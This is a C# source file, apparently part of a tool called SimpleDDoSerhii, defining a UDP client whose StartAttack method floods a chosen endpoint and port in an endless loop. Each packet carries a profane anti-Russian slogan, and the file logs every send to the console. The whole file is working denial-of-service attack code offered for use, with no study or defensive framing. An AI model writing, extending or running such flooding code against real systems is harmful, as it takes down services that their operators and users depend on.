using SimpleDDoSerhii.Entites;
using System;
using System.Text;
using System.Threading;
using SimpleDDoSerhii.Exceptions;

namespace SimpleDDoSerhii.Clients
{
    public class UdpClient : IDisposable, IClient
    {
        private bool disposedValue;
        [ThreadStatic]
        private System.Net.Sockets.UdpClient _client;
        private ConsoleColor TextColor;
        private byte[] data = Encoding.UTF8.GetBytes("russkiy voenniy korabl - idi na xuy");
        public UdpClient()
        {
            _client = new System.Net.Sockets.UdpClient();
            TextColor =
                        Console.ForegroundColor = (ConsoleColor)(new Random().Next(Enum.GetNames(typeof(ConsoleColor)).Length));
        }
        public void StartAttack(NetworkCredentional nc)
        {
            try
            {
                while (true)
                {
                    Console.ForegroundColor = TextColor;
                    _client.SendAsync(data, data.Length, nc.EndPointAddress, nc.DestinationPort);
                    Console.WriteLine($"{DateTime.Now.ToLongTimeString()}: Sent to endpoint {nc.EndPointAddress}:{nc.DestinationPort} By protocol: {nc.Protocol}");
                    Console.ResetColor();
                }
            }
            catch (BaseException e)
            {
                Console.WriteLine(e.Message);
                Dispose();
            }

            
        }
        protected virtual void Dispose(bool disposing)
        {
            if (!disposedValue)
            {
                if (disposing)
                {
                    this._client.Dispose();
                }
                disposedValue = true;
                this.data = null;
            }
        }
        public void Dispose()
        {
            Dispose(disposing: true);
            GC.SuppressFinalize(this);
        }
        ~UdpClient()
        {
            Dispose(disposing: false);
        }

    }
}
